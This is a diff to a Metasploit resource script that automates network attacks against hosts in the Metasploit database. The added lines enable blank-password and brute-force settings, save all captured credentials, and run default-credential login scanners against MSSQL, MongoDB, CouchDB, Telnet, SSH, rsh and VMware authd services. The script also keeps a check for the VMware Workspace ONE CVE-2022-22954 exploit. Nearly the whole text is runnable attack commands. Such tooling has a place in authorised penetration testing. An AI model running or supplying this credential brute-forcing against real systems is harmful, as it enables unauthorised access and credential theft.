@@ -1,4 +1,9 @@
 setg THREADS 150
+setg BLANK_PASSWORDS true
+setg BRUTEFORCE_SPEED 5
+setg VERBOSE true
+setg DB_ALL_CREDS true
+
 spool /root/output/msf/udp_scan.txt
 echo "####ADDITIONAL CHECKS####"
 
@@ -61,7 +66,7 @@ sleep 5
 echo "mssql_login"
 use auxiliary/scanner/mssql/mssql_login
 services -u -p 1433 -R
-set PASSWORD pass
+set USERPASS_FILE /opt/hacking/dfi/default_userpass.txt
 run
 sleep 5
 
@@ -94,7 +99,18 @@ echo "####NoSQL####"
 
 echo "MongoDB login scanner"
 use auxiliary/scanner/mongodb/mongodb_login
-hosts -R
+hosts -p 27017 -u -R
+set USERPASS_FILE /opt/hacking/dfi/default_userpass.txt
+run
+sleep 5
+
+echo "CouchDB login scanner"
+use auxiliary/scanner/couchdb/couchdb_login
+hosts -p 5984 -u -R
+run
+set SSL true
+set rport 6984
+hosts -p 6984 -u -R
 run
 sleep 5
 
@@ -123,12 +139,6 @@ sleep 5
 
 echo "smb_enumusers_domain - Determine what domain users are logged into a remote system via DCERPC"
 use auxiliary/scanner/smb/smb_enumusers_domain
-hosts -R
-run
-sleep 5
-
-echo "smb_lookupsid - Determine what users exist via brute force SID lookups"
-use auxiliary/scanner/smb/smb_lookupsid
 hosts -R
 run
 sleep 5
@@ -199,8 +209,7 @@ sleep 5
 
 echo "Telnet Login"
 use auxiliary/scanner/telnet/telnet_login
-set blank_passwords true
-set userpass_file /usr/share/metasploit-framework/data/wordlists/default_userpass_for_services_unhash.txt
+set userpass_file /opt/hacking/dfi/default_userpass.txt
 services -u -p 23 -R
 run
 sleep 5
@@ -222,7 +231,24 @@ echo "####SSH####"
 
 echo "ssh_version - Detect SSH VERSION"
 use auxiliary/scanner/ssh/ssh_version
-services -u -s ssh -R
+services -u -p 22 -R
+run
+sleep 5
+
+echo "SSH_Login - bruteforce logins"
+use auxiliary/scanner/ssh/ssh_login
+services -u -p 22 -R
+set userpass_file /opt/hacking/dfi/default_userpass.txt
+run
+sleep 5
+
+spool /root/output/msf/rsh.txt
+echo "####RSH####"
+
+echo "rsh login scan"
+use auxiliary/scanner/rservices/rsh_login
+services -u -p 514 -R
+set userpass_file /opt/hacking/dfi/default_userpass.txt
 run
 sleep 5
 
@@ -295,6 +321,12 @@ sleep 5
 use exploit/linux/http/vmware_workspace_one_access_cve_2022_22954
 services -S vmware -R
 check
+sleep 5
+
+use auxiliary/scanner/vmware/vmauthd_login
+services -p 902 -u -R
+set userpass_file /opt/hacking/dfi/default_userpass.txt
+run
 sleep 5
 
 spool /root/output/msf/rdp.txt
